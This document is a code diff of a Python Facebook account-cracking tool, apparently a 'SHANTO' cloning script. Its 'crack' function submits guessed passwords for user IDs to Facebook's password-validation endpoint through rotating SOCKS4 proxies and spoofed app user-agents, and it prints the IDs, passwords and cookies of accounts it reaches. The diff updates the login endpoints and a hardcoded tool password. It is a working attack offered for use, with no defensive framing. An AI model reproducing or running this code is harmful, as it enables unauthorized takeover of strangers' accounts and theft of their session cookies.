@@ -29,9 +29,6 @@ pretty.install()
 CON=sol()
 #------------------[ USER-AGENT ]-------------------#
 ua = "Dalvik/2.1.0 (Linux; U; Android 9; Redmi Note 8T MIUI/V11.0.11.0.PCXEUXM) [FBAN/Orca-Android;FBAV/288.0.0.15.118;FBPN/com.facebook.orca;FBLC/pl_PL;FBBV/253310653;FBCR/PLAY (T-Mobile);FBMF/Xiaomi;FBBD/xiaomi;FBDV/Redmi Note 8T;FBSV/9;FBCA/arm64-v8a:null;FBDM/{density=2.75,width=1080,height=2130};FB_FW/1;] FBBK/1",
-ua = "Mozilla/5.0 (iPhone; CPU iPhone OS 15_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 [FBAN/FBIOS;FBDV/iPhone12,1;FBMD/iPhone;FBSN/iOS;FBSV/15.2;FBSS/3;FBID/phone;FBLC/en_US;FBOP/5]"
-ua = "Dalvik/2.1.0 (Linux; U; Android 11; Pixel 4 Build/RP1A.201005.004) [FBAN/FB4A;FBAV/370.0.0.42.223;FBPN/com.facebook.katana;FBLC/en_US;FBBV/351108786;FBCR/]"
-ua = "Dalvik/2.1.0 (Linux; U; Android 10; Infinix Build/QQ3A.200805.001) [FBAN/FB4A;FBAV/370.0.0.42.223;FBPN/com.facebook.katana;FBLC/en_US;FBBV/351108786;FBCR/]"
 ua = "Dalvik/2.1.0 (Linux; U; Android 11; Samsung Galaxy S21 Build/RP1A.201005.004) [FBAN/FB4A;FBAV/370.0.0.42.223;FBPN/com.facebook.katana;FBLC/en_US;FBBV/351108786;FBCR/]"
 ugen2=[]
 ugen=[]
@@ -160,7 +157,7 @@ while attemps < 12345677901:
     username = input(' \033[0;92mEnter Username: ')
     password = input(' \033[0;93mEnter Password: ')
  
-    if username == 't' and password == 'r':
+    if username == 'r' and password == 'j':
         print(' \033[0;92mYou Have Successfully Logged in.')
         break
     else:
@@ -479,12 +476,12 @@ def crack(idf,pwv):
 			nip=random.choice(prox)
 			proxs= {'http': 'socks4://'+nip}
 			ses.headers.update({"Host":'mbasic.facebook.com',"upgrade-insecure-requests":"1","user-agent":ua2,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.7","dnt":"1","x-requested-with":"mark.via.gp","sec-fetch-site":"none","sec-fetch-mode":"navigate","sec-fetch-user":"?1","sec-fetch-dest":"document","referer":"https://mbasic.facebook.com/","accept-encoding":"gzip, deflate, sdch","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"})
-			p = ses.get('https://p.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&refsrc=deprecated&_rdr')
+			p = ses.get('https://m.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&refsrc=deprecated&_rdr')
 			dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),"uid":idf,"next":"https://p.facebook.com/login/save-device/","flow":"login_no_pin","pass":pw,}
 			koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
 			koki+=' m_pixel_ratio=2.625; wd=412x756'
 			heade = {'Host': 'mbasic.facebook.com', 'viewport-width': '980', 'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"', 'sec-ch-ua-mobile': '?1', 'sec-ch-ua-platform':'"Android"', 'sec-ch-prefers-color-scheme': 'dark', 'dnt': '1', 'upgrade-insecure-requests': '1', 'user-agent': ua, 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.7', 'sec-fetch-site': 'none', 'sec-fetch-mode': 'navigate', 'sec-fetch-user': '?1', 'sec-fetch-dest': 'document', 'accept-encoding': 'gzip, deflate, sdch', 'accept-language': 'en-US,en;q=0.9'}
-			po = ses.post('https://p.facebook.com/login/device-based/validate-password/?shbl=0',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False,proxies=proxs)
+			po = ses.post('https://m.facebook.com/login/device-based/validate-password/?shbl=0',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False,proxies=proxs)
 			if "checkpoint" in po.cookies.get_dict().keys():
 				#SHANTO-King
 				print(f'\r\033[0;94m[{time.strftime("%H:%M")}â€¢SHANTO-Cp] {idf} â€¢ {pw}\n\033[0;93[ðŸ¤Ÿ]= COOKIESâ€¢ \033[0;92m{kuki} ')     
